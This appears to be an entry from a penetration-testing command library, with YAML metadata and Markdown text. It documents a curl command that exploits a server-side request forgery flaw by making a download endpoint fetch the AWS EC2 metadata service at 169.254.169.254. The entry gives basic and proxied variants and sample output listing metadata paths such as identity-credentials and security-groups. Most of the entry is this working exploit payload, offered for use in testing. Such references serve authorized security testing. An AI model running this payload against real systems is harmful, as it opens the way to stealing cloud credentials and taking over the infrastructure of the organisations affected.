---
id: cmd-curl-ssrf-aws
data: >-
  curl -X GET
  "https://██████████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/"
  -v
tags:
  - ssrf
  - aws
  - recon
type: command
output: >-
  HTTP/1.1 200 OK\nContent-Type:
  text/plain\n\nami-id\nami-launch-index\nami-manifest-path\nblock-device-mapping/\nevents/\nhostname\nidentity-credentials/\ninstance-action\ninstance-id\ninstance-life-cycle\ninstance-type\nlocal-hostname\nlocal-ipv4\nmac\nmetrics/\nnetwork/\nplacement/\nprofile\npublic-hostname\npublic-ipv4\npublic-keys/\nreservation-id\nsecurity-groups\nservices/
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:09.697Z'
verified: false
validated: true
submitted: true
---
# curl-ssrf-aws-metadata

## Command

```bash
curl -X GET "https://██████████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/" -v
```

## Description

This command exploits an SSRF vulnerability by sending a GET request to the vulnerable /api/v1/download-url endpoint with a URL parameter pointing to the AWS EC2 metadata service, causing the server to fetch and potentially leak internal metadata paths. Use it to test SSRF in web applications hosted on AWS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| `url=http://169.254.169.254/latest/meta-data/` | The SSRF payload targeting AWS metadata endpoint | Yes |
| `-v` | Verbose output to show request/response details | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://target.com/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/" -v
```

### Advanced Usage

```bash
curl -x http://127.0.0.1:8080 -X GET "https://target.com/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/" -v
```

(Uses proxy at localhost:8080 for interception)

## Expected Output

Successful execution returns an HTTP 200 OK response with a plain-text listing of AWS metadata paths, including ami-id, instance-id, security-groups, and others, confirming the SSRF leak.

## Related

- [[Related Procedure|procedures/Exploit-SSRF-to-Leak-AWS-Metadata]]
